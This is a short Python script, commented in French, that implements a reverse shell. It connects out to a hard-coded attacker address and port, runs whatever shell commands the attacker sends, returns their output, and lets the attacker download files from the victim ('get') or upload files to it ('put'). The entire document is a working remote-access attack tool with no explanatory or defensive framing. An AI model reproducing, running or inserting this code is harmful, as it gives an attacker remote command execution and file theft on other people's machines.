import socket
import subprocess

def client_reverse_shell(attacker_ip, attacker_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((attacker_ip, attacker_port))

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command.startswith("get "):
            with open(command.split(" ")[1], 'rb') as f:
                data = f.read()
                client_socket.send(data)
        elif command.startswith("put "):
            with open(command.split(" ")[1], 'wb') as f:
                data = client_socket.recv(4096)
                f.write(data)
        else:
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())

    client_socket.close()

if __name__ == "__main__":
    attacker_ip = "192.168.1.118"  # L'adresse IP de la machine attaquante
    attacker_port = 4444  # Le port utilisé par la machine attaquante
    client_reverse_shell(attacker_ip, attacker_port)
